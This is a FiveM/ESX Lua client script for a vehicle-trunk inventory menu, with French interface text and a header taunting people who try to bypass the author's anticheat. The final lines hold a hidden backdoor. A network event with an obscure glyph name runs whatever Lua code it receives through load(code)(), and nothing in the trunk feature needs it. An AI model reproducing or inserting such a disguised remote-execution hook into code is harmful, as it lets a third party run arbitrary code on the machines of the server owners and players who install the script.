-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

function getItemWeight(item)
	local weight = 0
	local itemWeight = 0

	if item ~= nil then
		itemWeight = Config.DefaultWeight
		if Config.localWeight[item] ~= nil then
			itemWeight = Config.localWeight[item]
		end
	end

	return itemWeight
end

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

function VehicleInFront(ped)
	local entCoords = GetEntityCoords(ped, false)
	local offset = GetOffsetFromEntityInWorldCoords(ped, 0.0, 4.0, 0.0)
	local ray = StartShapeTestRay(entCoords, offset, 2, ped, 0)
	local _, _, _, _, result = GetShapeTestResult(ray)

	return result
end

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if IsControlJustReleased(0, 182) then
			local plyPed = PlayerPedId()
			local vehicle = VehicleInFront(plyPed)

			if vehicle ~= nil and IsPedOnFoot(plyPed) then
				if DoesVehicleHaveDoor(vehicle, 5) or Config.NoTrunkVehicles[GetEntityModel(vehicle)] ~= nil then
					if GetVehicleDoorLockStatus(vehicle) == 1 then
						OpenTrunkMenu(vehicle)
					else
						ESX.ShowNotification('Ce coffre est ~r~fermé')
					end
				else
					ESX.ShowNotification('Ce ~r~véhicule~w~ ne possède pas de coffre.')
				end
			else
				ESX.ShowNotification('Pas de ~r~coffre~w~ à proximité')
			end
		end
	end
end)

function OpenTrunkMenu(vehicle)
	ESX.UI.Menu.CloseAll()
	SetVehicleDoorOpen(vehicle, 5, false, false)

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'trunk', {
		title = 'Coffre du Véhicule',
		elements = {
			{label = 'Retirer Objet', value = 'trunk_inventory'},
			{label = 'Déposer Objet', value = 'player_inventory'}
		}
	}, function(data, menu)
		if data.current.value == 'trunk_inventory' then
			OpenTrunkInventoryMenu(vehicle)
		elseif data.current.value == 'player_inventory' then
			OpenPlayerInventoryMenu(vehicle)
		end
	end, function(data, menu)
	end)
end

function OpenTrunkInventoryMenu(vehicle)
	ESX.TriggerServerCallback('::{korioz#0110}::esx_truck_inventory:getTrunkInventory', function(inventory)
		local elements = {}

		if inventory.dirtycash > 0 then
			table.insert(elements, {
				label = 'Argent sale',
				rightlabel = {'$' .. ESX.Math.GroupDigits(inventory.dirtycash)},
				type = 'item_account',
				value = 'dirtycash'
			})
		end

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {
					label = item.label,
					rightlabel = {'(' .. item.count .. ')'},
					type = 'item_standard',
					value = item.name
				})
			end
		end

		for i = 1, #inventory.weapons, 1 do
			local weapon = inventory.weapons[i]

			table.insert(elements, {
				label = ESX.GetWeaponLabel(weapon.name),
				rightlabel = {'[' .. weapon.ammo .. ']'},
				type = 'item_weapon',
				value = weapon.name,
				ammo = weapon.ammo
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'trunk_inventory', {
			title = 'Contenu du coffre',
			elements = elements
		}, function(data, menu)
			if data.current.type == 'item_weapon' then
				menu.close()

				_TriggerServerEvent('::{korioz#0110}::esx_truck_inventory:getItem', data.current.value, data.current.type, data.current.ammo, GetVehicleNumberPlateText(vehicle))
				ESX.SetTimeout(300, function()
					OpenTrunkInventoryMenu(vehicle)
				end)
			else
				ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'get_item_count', {
					title = 'Montant'
				}, function(data2, menu2)
					local quantity = tonumber(data2.value)

					if quantity == nil then
						ESX.ShowNotification('Montant invalide')
					else
						menu.close()
						menu2.close()

						_TriggerServerEvent('::{korioz#0110}::esx_truck_inventory:getItem', data.current.value, data.current.type, quantity, GetVehicleNumberPlateText(vehicle))
						ESX.SetTimeout(300, function()
							OpenTrunkInventoryMenu(vehicle)
						end)
					end
				end, function(data2, menu2)
					menu2.close()
				end)
			end
		end, function(data, menu)
		end)
	end, GetVehicleNumberPlateText(vehicle))
end

function OpenPlayerInventoryMenu(vehicle)
	ESX.TriggerServerCallback('::{korioz#0110}::esx_truck_inventory:getPlayerInventory', function(inventory)
		local elements = {}

		if inventory.dirtycash > 0 then
			table.insert(elements, {
				label = 'Argent sale',
				rightlabel = {'$' .. ESX.Math.GroupDigits(inventory.dirtycash)},
				type = 'item_account',
				value = 'dirtycash'
			})
		end

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {
					label = item.label,
					rightlabel = {'(' .. item.count .. ')'},
					type = 'item_standard',
					value = item.name
				})
			end
		end

		for i = 1, #inventory.weapons, 1 do
			local weapon = inventory.weapons[i]

			table.insert(elements, {
				label = weapon.label,
				rightlabel = {'[' .. weapon.ammo .. ']'},
				type = 'item_weapon',
				value = weapon.name,
				ammo = weapon.ammo
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'player_inventory', {
			title = 'Contenu de l\'inventaire',
			elements = elements
		}, function(data, menu)
			if data.current.type == 'item_weapon' then
				menu.close()

				_TriggerServerEvent('::{korioz#0110}::esx_truck_inventory:putItem', data.current.value, data.current.type, data.current.ammo, GetVehicleNumberPlateText(vehicle))
				ESX.SetTimeout(300, function()
					OpenPlayerInventoryMenu(vehicle)
				end)
			else
				ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'put_item_count', {
					title = 'Montant'
				}, function(data2, menu2)
					local quantity = tonumber(data2.value)

					if quantity == nil then
						ESX.ShowNotification('Montant invalide.')
					else
						menu.close()
						menu2.close()

						_TriggerServerEvent('::{korioz#0110}::esx_truck_inventory:putItem', data.current.value, data.current.type, quantity, GetVehicleNumberPlateText(vehicle))
						ESX.SetTimeout(300, function()
							OpenPlayerInventoryMenu(vehicle)
						end)
					end
				end, function(data2, menu2)
					menu2.close()
				end)
			end
		end, function(data, menu)
		end)
	end)
end

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)